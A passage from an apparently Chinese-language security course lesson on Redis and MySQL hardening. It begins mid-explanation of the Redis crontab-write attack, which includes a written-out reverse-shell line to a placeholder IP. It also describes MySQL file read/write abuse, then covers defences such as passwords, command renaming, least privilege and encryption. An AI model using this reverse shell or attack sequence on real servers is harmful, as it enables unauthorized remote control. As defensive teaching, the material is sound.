# 清除痕迹    r.config_set('dir', '/tmp')针对这个过程，我来详细解释一下，你可以结合代码来看。1.  黑客连入 Redis。        2.  黑客写入一个任意的 Key，对应的 Value 是想要执行的命令，并按照    Crontab    的格式进行拼接。代码如下：        ```{=html}```    */1* * * * /bin/bash -i >& /dev/tcp/1.2.3.4/80800>&11.  黑客调用 config_set 方法，就是通过 Redis 的 CONFIG 命令，将 Redis    数据持久化的目录修改成    /var/spool/cron。        2.  黑客调用 save 方法，通过 Redis 的 SAVE 命令，发起 Redis    的数据持久化功能。最终，Redis 将数据写入到 /var/spool/cron    中。写入的文件效果如下：        ![](Images/d20e5d4145af93203bd13bd7d4f1210e.png)savepage-src="https://static001.geekbang.org/resource/image/6e/81/6e78c556b7f2d5d5c4fc0d1d5bd93281.png"}1.  Crontab    对于无法解析的数据会直接跳过，因此，开头和结尾的乱码不会影响 Crontab    的执行。最终，Crontab 会执行到 Value    中对应的命令。        这样一来，黑客就"聪明"地利用 Redis 保存文件的功能，修改了Crontab，然后利用 Crontab执行了命令。那么，我们该如何对 Redis进行安全防护呢？这里就需要提到我们前面讲过的"黄金法则"和"最小权限原则"了。首先，从认证上来说，Redis 提供了最简单的密码认证功能。在 Redis的配置文件中，只要增加一行 requirepass 123456，我们就能够为 Redis设置一个密码了。但是，这里有两点需要你注意。1.  Redis    的性能很高，理论上黑客能够以每秒几十万次的速度来暴力猜测密码。因此，你必须设置一个足够强的密码。我比较推荐随机生成一个    32 位的"数字加字母"的密码。而且 Redis    的密码直接保存在配置文件当中，你并不需要记忆它，需要的时候直接查看就好了。        2.  Redis 是为了高性能而设计的。之所以 Redis    默认不配置密码，就是因为密码会影响性能。按照我之前的测试，加上密码之后，Redis    的整体性能会下降 20% 左右。这也是很多开发和运维，明明知道 Redis    有安全风险，仍然保持无密码状态的原因。所以，是否给 Redis    设置密码，还需要你根据实际的情况进行权衡。        其次是进行授权。尽管 Redis本身不提供授权机制，但是我们仍然可以通过"重命名"来间接地实现授权功能。我们可以在Redis 的配置文件中加入 rename-command CONFIGpUVEYEvdaGH2eAHmNFcDh8Qf9vOej4Ho，就可以将 CONFIG功能的关键词，变成一个随机的字符串，黑客不知道这个字符串，就无法执行CONFIG 功能了。而且，你仍然可以通过新的命令，来正常的使用 CONFIG功能，不会对你的正常操作产生任何影响。现在，你应该已经知道在认证和授权上，我们能使用的防护手段了。那在审计上，因为Redis 只提供了基本的日志功能（日志等级分为：Debug、Verbose、Notice 和Warning），实用信息不多，也就没有太多的应用价值。除了认证和授权，如果你还想要对 Redis中的数据进行加密，那你只能够在客户端中去集成相应的功能，因为 Redis本身不提供任何加密的功能和服务。最后，我们还要避免使用 ROOT 权限去启动Redis，这就需要用到"最小权限原则"了。在前面命令执行的例子中，黑客是通过Redis 的保存功能，将命令"写入 Crontab"来实现的命令执行功能。而"写入Crontab"这个操作，其实是需要 ROOT权限的。因此，我们以一个低权限的用户（比如 nobody）身份来启动Redis，就能够降低黑客连入 Redis 带来的影响了。当然，Redis本身也需要保存日志和持久化数据，所以，它仍然需要写入日志文件的权限（小于ROOT 权限）来保证正常运行。总结来说，Redis是一个极度看重性能的数据库，为了性能舍弃掉了部分的安全功能。我们可以通过"增加密码""使用最小权限原则"和"授权"的方式，在一定程度上提升Redis的安全性。但是，这些防护手段更多的是一种缓解机制，为了保证安全性，我们最好是只在可信的网络中使用Redis。 MySQL 安全讲到这里，你现在应该也能总结出，黑客攻击数据库的主要方式，除了执行各种命令对数据库中的数据进行"增删改查"，就是在连入数据库后，通过各种手段实现命令执行，最终控制整个服务器。那在 MySQL中，黑客的攻击方式又有什么不同呢？因为 MySQL的功能十分强大，自身就提供了和本地文件交互的功能。所以，通过 LOAD DATAINFILE，MySQL 可以读取服务器的本地文件；通过 SELECT ... INTODUMPFILE，MySQL 也能够将数据写入到本地文件中。因此，在黑客连入 MySQL之后，通过读文件的功能，黑客就能够对服务器的任意文件进行读取，比如敏感的/etc/passwd 或者应用的源代码等；通过写文件的功能，则可以仿照 Redis 修改Crontab的原理，实现命令执行的功能。相比于 Redis，MySQL是一个比较成熟的数据库工具，自身的安全性就很高，所以通过正确地配置 MySQL的安全选项，我们就能够获得较高的安全保障。那么，MySQL在黄金法则和加密上，分别提供了哪些功能呢？MySQL提供了多用户的认证体系，它将用户的相关信息（认证信息、权限信息）都存储在了mysql.user 这个系统表中。利用这个系统表，MySQL可以通过增删改查操作，来定义和管理用户的认证信息、权限列表等。除此之外，在认证上，MySQL还提供了比较完善的密码管理功能，它们分别是：1.  密码过期，强制用户定期修改密码；        2.  密码重用限制，避免用户使用旧的密码；        3.  密码强度评估，强制用户使用强密码；        4.  密码失败保护，当用户出现太多密码错误的尝试后锁定账户。        那么，通过这些密码管理的机制，你就能够拥有一个相对安全的认证体系了。在多用户的认证体系中，授权是必不可少的。那 MySQL中的授权机制是怎样的呢？    GRANT ALL PRIVILEGES ON db.table TO user@"127.0.0.1" IDENTIFIED BY "password"我们通过修改权限的 GRANT 命令来具体分析一下，MySQL授权机制中的主体、客体和请求。1.  主体（user@"127.0.0.1" IDENTIFIED BY "password"）：MySQL    的主体是通过用户名、IP    和密码这三个信息组合起来进行标记的。        2.  客体（db.table）：MySQL    的客体是数据库和表。        3.  请求（ALL PRIVILEGES）：MySQL    将请求的类型定义成了特权（PRIVILEGES）。常见的特权有 INSERT、DELETE    等增删改查操作（如果你想要了解其他更细粒度的特权，可以在        [官方文档            slate-object="inline"    中进行查看）。        除此之外，MySQL 也定义了 ROLE 的概念，你可以基于这个功能，去实现role-BAC 机制。虽然和 Redis 一样，MySQL 本身也不提供审计功能。但是，MySQL可以通过第三方插件，来提供审计的服务。比如 McAfee提供的mysql-auditslate-object="inline"以及MariaDB AuditPlugin  slate-object="inline"。这些插件能够自动收集必要的 MySQL 操作信息，并推送到你的ELK等日志集群中，方便你进行持续的审计操作。在加密方面，MySQL 既提供传输过程中 SSL（Security SocketLayer）加密，也提供存储过程中硬盘加密。我们首先来看 MySQL 的 SSL 加密功能。开启 SSL功能，需要在配置文件中配置如下命令：    [mysqld    ssl-ca=ca.pem    ssl-cert=server-cert.pem    ssl-key=server-key.pem但是，这些配置并不能强制客户端使用 SSL连接。想要杜绝全部非安全连接的话，我们可以在配置文件中添加require_secure_transport=ON，来进行强制限制。接着，我们来看，MySQL中提供的硬盘加密功能。硬盘加密过程主要涉及两个密钥，一个主密钥和一个表密钥。表密钥由MySQL随机生成，通过主密钥进行加密后，存储在表头信息中。因此，每一个表格都拥有不同的密钥。MySQL 的加密功能是由 keyring_file 这个插件来提供的。需要注意的是，当keyring_file第一次启动的时候，它会生成一个主密钥文件在当前的系统中。你一定要备份这个密钥文件，因为它一旦丢失，数据库中的全部数据，都将因为无法解密而丢失。现在，你应该了解了，MySQL在黄金法则上都提供了哪些功能。接下来，我们再来看"最小权限原则"。和 Redis 一样，MySQL 也需要避免以 ROOT 权限启动。不一样的是，MySQL默认提供了这样的能力，当我们在 Linux 中通过 mysqld 来启动 MySQL进程的时候，mysqld 会自动的创建一个具备最小权限的 mysql用户，并赋予这个用户对应日志文件的权限，保证 MySQL拥有必要的最小权限。总之，MySQL是一个非常成熟的数据库工具，它提供了完整的安全功能。通过对认证、授权、审计和加密功能的正确配置，你就能够迅速提升MySQL 的整体安全性。总结今天，我们以 Redis 和 MySQL这两种比较典型的数据库为例，对它们的安全性，以及攻破后能产生的危害进行了分析。在这里，我把安全防护的关键内容总结了一张表格，希望能够帮助你加深理解。![](Images/57379ed05b30ee71e16e6a01f28409f9.png)savepage-src="https://static001.geekbang.org/resource/image/cf/38/cfef962b04ea94100920d60188996638.jpeg"}通过对这两种数据库的分析，我们知道，数据库面临的威胁不止存在于数据本身，也会影响到数据库所在的服务器。在数据库本身的安全防护上，我们可以通过对"黄金法则"的运用，在认证、授权、审计和加密方面，为其设置一定的保护能力。同时，为了避免数据库对服务器的衍生影响，我们也应该落实"最小权限原则"，避免以 ROOT权限去启动数据库服务。当然，目前成熟的数据库产品肯定不止这两种。但是，我希望通过对这两种数据库的安全分析，让你掌握数据库安全的主要内容，在实际工作中，能够做到活学活用，自主去分析你用到的数据库。思考题最后，让我们来看一道思考题。在实际工作，除了 Redis 和MySQL，你还会用到哪些数据库？你可以思考一下，这些数据库有哪些安全事项呢？你可以按照我给出的表格，试着总结出相关的安全防护手段。欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友。我们下一讲再见！